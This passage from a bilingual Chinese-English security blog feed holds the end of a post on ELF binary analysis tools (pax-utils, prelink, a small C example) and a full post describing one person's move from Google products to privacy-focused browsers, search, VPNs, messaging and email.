&lt;p&gt;&lt;em&gt;註: ELFKickers 的作者專注在操作 ELF 檔岸上，或許對想要學習畸形 ELF 二進位檔有幫助&lt;/em&gt;&lt;/p&gt;

&lt;h4 id=&quot;pax-utils&quot;&gt;pax-utils&lt;/h4&gt;
&lt;ul&gt;
  &lt;li&gt;/usr/bin/dumpelf – dump internal ELF structure&lt;/li&gt;
  &lt;li&gt;/usr/bin/lddtree – like ldd, with levels to show dependencies&lt;/li&gt;
  &lt;li&gt;/usr/bin/pspax – list ELF/PaX information about running processes&lt;/li&gt;
  &lt;li&gt;/usr/bin/scanelf – wide range of information, including PaX details&lt;/li&gt;
  &lt;li&gt;/usr/bin/scanmacho – shows details for Mach-O binaries (Mac OS X)&lt;/li&gt;
  &lt;li&gt;/usr/bin/symtree – displays a leveled output for symbols&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;em&gt;Notes: Several of the utilities in this package can scan recursively in a whole directory. Ideal for mass-analysis of a directory. The forcus of the tools is to gather PaX details. Besides ELF support, some details regarding Mach-O binaries can be extracted as well.&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;&lt;em&gt;註: 在這個套裝軟體中數個功能可以遞迴的掃描一整個目錄。用於對一個目錄的大量分析。這個工具聚焦的點在於集合 PaX 細節。除了 ELF 的支援，一些關於 Mach-O 二進位的細節也可以被萃取。&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;Example outputs&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;範例輸出&lt;/p&gt;
&lt;/blockquote&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;scanelf -a /bin/ps
 TYPE    PAX   PERM ENDIAN STK/REL/PTL TEXTREL RPATH BIND FILE 
ET_EXEC PeMRxS 0755 LE RW- R-- RW-    -      -   LAZY /bin/ps
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h4 id=&quot;prelink&quot;&gt;prelink&lt;/h4&gt;

&lt;ul&gt;
  &lt;li&gt;/usr/bin/execstack – display or change if stack is executable&lt;/li&gt;
  &lt;li&gt;/usr/bin/prelink – remaps/relocates calls in ELF files, to speed up process&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;example--範例&quot;&gt;Example / 範例&lt;/h2&gt;

&lt;p&gt;If you want to create a binary yourself, simply create a small C program, and compile it. Here is an example, which opens /tmp/test.txt, reads the contents into a buffer and displays it. Make usre to create the related /tmp/test.txt file.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;如果你想要自己創造一個二進位檔，簡單的創建一個小型的 C 程式，並編譯它。這裡是一個範例，可以打開 /tmp/test.txt，將內容讀進一個緩衝區並顯示。記得要確認創建 /tmp/test.txt 檔案。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;pre&gt;&lt;code class=&quot;language-clike&quot;&gt;#include &amp;lt;stdio.h&amp;gt;

int main(int argc, char **argv)
{
   FILE *fp;
   char buff\[255\];

   fp = fopen(&quot;/tmp/test.txt&quot;, &quot;r&quot;);
   fgets(buff, 255, fp);
   printf(&quot;%s\\n&quot;, buff);
   fclose(fp);

   return 0;
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;This program can be compiled with: gcc -o test test.c&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;這個程式用 &lt;code class=&quot;highlighter-rouge&quot;&gt;gcc -o test test.c&lt;/code&gt; 來編譯&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h2 id=&quot;more-sources--更多資料來源&quot;&gt;More sources / 更多資料來源&lt;/h2&gt;

&lt;p&gt;If you like to know more, a good source would be to follow WikiPedias Executable and Linkable Format(ELF) page. Another good in-depth document: ELF_Format and the document authored by Brian Raiter (ELFkikers). For those who love to read sources, have a look at documented ELF structure header file from Apple. And them finally, if you really wnat to know how a binary works, test it with a disassembler tool like Hopper for Linux.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;如果你傾向於知道更多，一個好的來源包括維基百科 &lt;a href=&quot;https://en.wikipedia.org/wiki/Executable_and_Linkable_Format&quot;&gt;Executable and Linkable Format (ELF)&lt;/a&gt;頁面。另外一個詳盡的文件:作者與 ELFkickers 相同的著作 &lt;a href=&quot;http://www.skyfree.org/linux/references/ELF_Format.pdf&quot;&gt;ELF Format&lt;/a&gt;。對那些愛上閱讀原始資料，看一看這個從 Apple 的文件 &lt;a href=&quot;http://www.opensource.apple.com/source/dtrace/dtrace-90/sys/elf.h&quot;&gt;ELF structure header file&lt;/a&gt;。最後，如果你真的想要知道一個二進位檔案是如何運作的，使用像是 &lt;a href=&quot;https://www.hopperapp.com/&quot;&gt;Hopper for Linux&lt;/a&gt; 的反組譯工具來做測試。&lt;/p&gt;
&lt;/blockquote&gt;</content><author><name>jhe</name></author><category term="Linux" /><category term="ELF" /><summary type="html">The 101 of ELF Binaries on Linux: Understanding and Analysis</summary></entry><entry><title type="html">珍惜隱私遠離 Google</title><link href="https://security-onigiri.github.io//2018/03/08/taking-privacy-seriously-leaving-google-behind.html" rel="alternate" type="text/html" title="珍惜隱私遠離 Google" /><published>2018-03-08T00:00:00+08:00</published><updated>2018-03-08T00:00:00+08:00</updated><id>https://security-onigiri.github.io//2018/03/08/taking-privacy-seriously-leaving-google-behind</id><content type="html" xml:base="https://security-onigiri.github.io//2018/03/08/taking-privacy-seriously-leaving-google-behind.html">&lt;h1 id=&quot;taking-privacy-seriously-leaving-google-behind&quot;&gt;Taking privacy seriously leaving google behind&lt;/h1&gt;

&lt;p&gt;Recently, I made the decision to become a little more seucure on the internet. I don’t have much to hide except maybe bank account info, but I was struck by a Glenn Greenwald quote from a TED Talk he gave about privacy.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;最近，我做了成為一個在網際網路上多多一點安全的決定。除了我的銀行帳戶資訊我沒有什麼好隱藏的，但我被 Gleen Greenwald 在 TED 有關隱私的演講給打擊了。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Over the last 16 months, as I’ve debated this issue around the world, every single time somebody has said to me, “I don’t really worry about invasions of privacy because I don’t have anything to hide.” I always say the same thing to them. I get out a pen, I write down my email address. I say, “Here’s my email address. What I want you to do when you get home is email me the passwords to all of your email accounts, not jsut the nice, respectable work one in your name, but all of them, because I want to be able to just troll through what it is your’re doing online, read what I want to read and publish whatever I find interesting. After all, if you’re not a bad person, if you’re doing nothing wrong, you should have nothing to hide.” Not a single person has taken me up on that offer.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;過去的16個月，我跟全世界辯論這個議題，當每次某個人對我說 “我並不擔心隱私權的侵犯，我並沒有甚麼東西好隱藏的。” 我總是對他們說一同樣的話。我拿出一枝筆，寫下我的電子郵件地址，並且對他們說 “這是我的電子郵件地址。我要你做的是，當你回到家就把你所有的電子郵件帳戶密碼寄給我，不只是要工作用漂漂亮亮的那個，而是要全部。因為我要能搜索你在網路上做的事情，知道且公布任何我想要知道的有趣事情。畢竟，如果你不是一個壞人，如果你沒有做任何不對的事情，你應該沒什麼好隱藏的。” 沒有一個人肯接受我的提議。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;I find myself tired of knowing Google is going through the content of my emails and examining my searches to sell me things.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;我發現自己已經厭倦於知道 Google 從頭到尾瀏覽我的電子郵件內容，並檢查我的搜尋紀錄，為的是賣東西給我。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;I also know our new goverment (not that our old was too much better) is tracking the activities of anyone who is anti-fascist. I don’t trust them to follow the laws that would otherwise keep me secure from illegal search.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;我也知道我們的新政府(我們的舊政府並沒有好一點)正在追蹤任何反法西斯分子的活動情形。我不相信只要遵守法律便能使我安全的遠離非法搜索。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;So I set out to become more private and that meant leaving Google products and using encrypted, more secure alternatives.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;所以打算變得更有隱私，那就表示遠離 Google 產品並且使用加密與更安全的替代方案。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;So what I have I found ? Well, I have spent the last weeks and months testing products and making decisions on what I would do.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;所以我發現了甚麼 ? 哎呀，我費了數個月直到上個星期，都在測試產品並決定我開怎麼做。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Here is what I found.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;這是我的發現。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;&lt;strong&gt;Browser:&lt;/strong&gt;&lt;/p&gt;
&lt;blockquote&gt;
  &lt;p&gt;&lt;strong&gt;瀏覽器:&lt;/strong&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;The first, maybe the easiest step was changing my browser away from Google’s Chrome browser. I decided to go with Firefox’s nightly builds because they seem to run faster and feel a bit more Chrome like, so the switch wouldn’t be so shocking. With Firefox account syncing options, it wasn’t hard to get my bookmarks synced across a few devices with ease.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;首先，或許最簡單的步驟是換掉我的 Google Chrome 瀏覽器。我決定使用 Firefox 的 nightly，因為它們似乎運行得更快而且感覺跟 Chrome 很像，所以移轉比較沒有障礙。用 Firefox 帳戶同步選項，自在的跨數個裝置同步我的書籤並不難。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;I also installed some plugins, thanks to recommendations from PrivacyTools.io, a site you should frequent for tips on internet privacy. I am now running Ublock Origin to block ads and trackers along with Privacy Badger and HTTPS Everywhere.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;我也安裝的了一些插件，感謝 PrivacyTools.io 的建議，一個你應該常常造訪的網站，獲取一些網路隱私的小技巧。我現正使用 Ublock Origin 來阻擋廣告與追蹤和 Privacy Badger 與 HTTPS Everywhere。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Alternatively, I run Tor Browser, a Firefox fork if I want an even greater layer of privacy.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;或者，我使用 Tor 瀏覽器，一個 Firefox 分支，如果想要更安全的隱私層級的話。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;&lt;strong&gt;Search:&lt;/strong&gt;&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;&lt;strong&gt;搜尋:&lt;/strong&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Who doesn’t use Google to find things? Sure, we all know that weird friend who users Yahoo still, or that one guy who still owns a Zune who uses Bing, but Google has it all.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;誰不使用 Google 來找尋事物? 當然，我們都有那種仍使用 Yahoo 的奇怪朋友，或是那個還擁有一台 Zune(編按: 微軟公司出品的可攜式媒體撥放器) 並使用 Bing 的人，但 Google 擁有一切。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;I started with the always popular DuckDuckGo, but I found I didn’t get very good search results and it seemed to load really slow for me. Thankfully, thanks to PrivacyTools, I discovered &lt;a href=&quot;https://www.startpage.com/&quot;&gt;StartPage&lt;/a&gt;.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;我一開始使用很夯的 DuckDuckGo，但我發現我不能得到很好的搜尋結果而且它貌似對我來說載入的頗為龜速，謝天謝地，感謝 PrivacyTools，我偶然發現 &lt;a href=&quot;https://www.startpage.com/&quot;&gt;StartPage&lt;/a&gt;。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;StartPage anonymiszes your searches through Google, so you will still get the quality Google results without them seeing you, and without the ads, It easily integrates right into Firefox on desktop and mobile.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;StartPage 匿名化你的 Google 搜尋，所以你將仍然可以獲得有品質的 Google 結果而不備他們看見，還沒有廣告，它簡易的整合進了 Firefox 桌面板與移動版。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;&lt;strong&gt;VPN:&lt;/strong&gt;&lt;/p&gt;
&lt;blockquote&gt;
  &lt;p&gt;&lt;strong&gt;VPN:&lt;/strong&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;When it came to choosing a VPN, I went through many trials. I asked for recommendations and started with the most poular, Private Internet Access, but I didn’t like that they were based in the US, but also found their speeds not all that great. Next I tried NordVPN. The speeds were actually greate on my iPhone, but they don’t offer a native Linux app setting up their different servers was kind of pain.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;當我來到要選擇一個 VPN 時，我嘗試了好幾個實驗。我尋求了建議並從人氣最旺的開始，Private Internet Access(編按:一個匿名的私人 VPN 服務)，但我不喜歡它位在美國，但也因為他們的速度不是很理想。下一個我試了 NordVPN。在我的 iPhone 上速度不錯，但他們沒有原生 Linux 應用程式設定他們不同的伺服器是一大痛點。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Finally, I settled on one was recommended a few times, Mullvad. The price is good ($5/mo), and the speeds are wonderful. I use OpenVPN on my phone, but for my laptop running Linux Mint, and for my media server at home, and old Mac, they offer a native app which makes connecting easy.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;最後，我決定用被建議過數次的，&lt;a href=&quot;https://www.mullvad.net/&quot;&gt;Mullvad&lt;/a&gt;。價錢不錯 ($5/mo)，而且速度卓越。在手機上我使用 OpenVPN，還有我運行 Linux Mint 的筆記型電腦，還有我在家裡的數位媒體伺服器，跟舊 Mac，他們提供了原生應用程式可以很簡單的連接起來。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;I also have a free VPN account with &lt;a href=&quot;https://protonvpn.com/&quot;&gt;ProtonVPN&lt;/a&gt;, and another with &lt;a href=&quot;http://www.riseup.net/&quot;&gt;RiseUp&lt;/a&gt;.
These secondary options, which give me okay speeds, allow me backups if shomethings goes wrong with Mullvad.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;我還有一個免費的 &lt;a href=&quot;https://protonvpn.com/&quot;&gt;ProtonVPN&lt;/a&gt; 帳戶，還有另一個 &lt;a href=&quot;http://www.riseup.net/&quot;&gt;RiseUp&lt;/a&gt; 的。這些次要選項，有著還 ok 的速度，在 Mullvad 出甚麼問題的時候可以讓我可以備用。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;&lt;strong&gt;Communications:&lt;/strong&gt;&lt;/p&gt;
&lt;blockquote&gt;
  &lt;p&gt;&lt;strong&gt;通訊:&lt;/strong&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;While this wasn’t really part of this move, I wanted to recommend some texting, video and voice calling apps that are amazing. I am loving Wire, a chat app that has both desktop and mobile clients. Also, the very popular Signal app.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;雖然這並不真的是這個行動的一部分，我想要推薦一些令人驚奇的文字、影片與語音通話應用程式。我鍾愛 &lt;a href=&quot;http://www.wire.com/&quot;&gt;Wire&lt;/a&gt;，一個聊天應用程式同時有著桌面與移動客戶端。還有很火紅的應用程式 &lt;a href=&quot;https://signal.org/&quot;&gt;Signal&lt;/a&gt;。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;For file sharing, I have installed OnionShare.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;我安裝了 OnionShare 來分享檔案。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;&lt;strong&gt;Email:&lt;/strong&gt;&lt;/p&gt;
&lt;blockquote&gt;
  &lt;p&gt;&lt;strong&gt;電子郵件:&lt;/strong&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;This was the last big piece of the puzzle. I have been on Gmail since they launched the first wave of invites. It’s a wonderful web based interface and a good mobile app. Replacing it wasn’t going to be easy. However, I do own my own domain, and figured it was time to use it.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;這是謎題的最後一個巨大的一片拼圖。在 Gmail 發動第一波測試邀請的時候，我就已經在使用了。那是一個美好的基於網頁的介面和一個好的移動裝置應用程式。要想取代它並不簡單。然而，我有擁有自己的域名，該是搞定並使用它的時候了。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;It came down to two providers for me. ProtonMail, makers of ProtonVPN, and Tutanota. Both offer a great service and allow custom domains on their paid accounts. Proton has a much nicer web and mobile interface, but Tutanota has been showing off its beta platform and it’s looking very promising.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;對我來說最後落在兩個供應商，ProtoMail，ProtonVPN 的製造者和 Tutanota。兩者都提供很棒的服務並且允許付費用戶自訂域名。Proton 有更好的網頁及移動裝置介面，但 Tutanota 正炫耀他們的測試平台，而且那看起來非常的有前途。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Here, it really came down to price for me. ProtonMail is $5/mo or $48 a year, while Tutanota is $12 a year.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;到了這個地步，對我來說就剩下價錢之爭了。ProtonMail 是一個月 $5 或一年 $48，Tutanota 則是一年 $12。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Given that Tutanota is open source, and they have a pipeline of amazing products in development, I pulled the trigger and moved my email there.&lt;/p&gt;

&lt;p&gt;考慮到 Tutanota 為開放原始碼，且他們有一個開發中的令人驚嘆的產品管道。我下了決定並將我的電子郵件移到這裡。&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;So what’s left?&lt;/strong&gt;&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;&lt;strong&gt;還剩下甚麼?&lt;/strong&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Well, first, here is what I am still using from Google:&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;啊，首先這裡是我仍然使用中的 Google 產品:&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Gmail: While I have switched, I have nearly a decade of stuff on Gmail and accounts that still point here and important pepole how have this email address. I will slowly begin to migrate them away and likely end up at the point where I just forward all my mail away from here.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Gmail: 當我移轉後，我有一個將近十年的東西在 Gmail 與帳戶上仍然指向這裡，並且重要的人有這個電子郵件地址。我將緩慢的開始遷移他們，最後結束在將我所有的郵件都轉送離這裡。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Google Photos: They offer free backup of all my iPhone photos. I have more than 10,000 photos here and don’t have a solid replacement in place yet.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Google Photos: 他們提供免費的備份我所有的 iPhone 照片。我在這裡有多過一萬張照片，並且還沒有一個可靠的替代品。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;YouTube: I mean, I can’t escape this one.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Youtube: 我的意思是，我沒辦法離開這個。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Google+: Yeah,it’s still a thing. I use it to share articles I have written. It also improves search results for my work.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Google+: 對，這東西還存在。我使用它來分享我寫的文章。它同時也對我的工作改善了搜結果。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Google Authenticator: I use 2-Step Authentication for as many sites as will allow and most use this app. The only app based alternative to this is Authy, and if you look in the comments, it’s problematic.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Google Authenticator: 我在很多網站使用兩步驟驗證，且多數都與許這個應用程式。唯一的基於應用程式的替代方案是 Authy，而且如果你看向留言，它還是有問題的。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Google Maps: Anyone have recommendations on good replacement for this?&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Google Maps: 任何人對這個有好的建議替代品嗎?&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;I also still use Facebook and Twitter which are privacy nightmares of their own.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;我也仍在使用隱私夢魘 Facebook 與 Twitter。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;I am also still looking for a good Google Docs replacement. I am testing out Dropbox Paper, and I use LibreOffice on Linux, but I’d like something I can use online more. The hunt continues.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;我也還在尋找一個好的 Google Docs 替代品。我正在測試 Dropbox Paper，並且我在 Linux 上使用 LibreOffice，但我想要某些可以線上使用的。狩獵仍持續著。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;What are you using? What recommendations do you have as I continue to improve myh privacy journey?&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;你正在用甚麼? 對我繼續改善隱私之旅你有什麼建議?&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Share in the comments.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;在留言分享&lt;/p&gt;
&lt;/blockquote&gt;

&lt;hr /&gt;</content><author><name>jhe</name></author><category term="privacy" /><summary type="html">Taking privacy seriously leaving google behind</summary></entry></feed>